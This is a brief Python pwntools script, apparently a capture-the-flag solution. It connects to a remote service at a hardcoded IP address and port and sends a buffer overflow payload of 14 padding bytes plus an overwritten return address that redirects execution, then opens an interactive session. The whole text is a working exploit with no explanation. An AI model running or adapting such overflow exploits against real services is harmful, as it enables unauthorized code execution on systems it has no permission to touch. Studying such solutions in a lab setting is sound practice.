from pwn import *

context(arch='i386', os='linux')

#p = process('./your_name', stdout=PIPE)
p= remote("13.232.171.97","1234")
p.recvuntil("(I really don't know why but you just have to)")


p.sendline("A"*14+"\x08\x04\x91\xc2"[::-1])
#p.send(p32(0x080491d2))



p.interactive()
